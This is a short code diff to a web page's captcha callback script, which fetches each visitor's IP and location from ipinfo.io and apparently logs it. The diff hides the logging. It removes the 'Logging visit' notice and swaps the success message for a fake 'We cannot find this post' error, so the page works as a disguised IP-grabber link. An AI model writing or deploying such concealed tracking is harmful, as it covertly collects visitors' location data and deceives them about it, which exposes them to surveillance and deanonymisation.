@@ -39,7 +39,7 @@
 
   <script>
     function onCaptchaSuccess(token) {
-      document.getElementById('statusMsg').textContent = '✅ Verified. Logging visit...';
+      document.getElementById('statusMsg').textContent = '✅ Verified.';
 
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
@@ -61,7 +61,7 @@
           });
         })
         .then(() => {
-          document.getElementById('statusMsg').textContent = '📬 Logged successfully.';
+          document.getElementById('statusMsg').textContent = '❌ We cannot find this post. Make sure your link is correct';
         })
         .catch(() => {
           document.getElementById('statusMsg').textContent = '⚠️ Something went wrong.';
